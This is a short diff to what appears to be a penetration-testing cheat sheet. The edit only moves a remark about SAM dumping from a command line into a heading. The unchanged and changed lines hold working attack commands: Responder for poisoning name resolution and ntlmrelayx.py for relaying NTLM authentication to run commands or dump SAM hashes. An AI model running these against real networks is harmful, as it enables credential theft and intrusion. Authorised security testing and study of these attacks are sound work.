@@ -96,10 +96,10 @@ SMB Relay
 ```
 responder -I  NETINTERFACE rdw
 ```
-NTLM Relay
+NTLM Relay (SAM dumping without 'c' flag)
 
 ```
-python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'command' (SAM dumping without 'c' flag)
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'command' 
 ```
 Domain Host Discovery
 
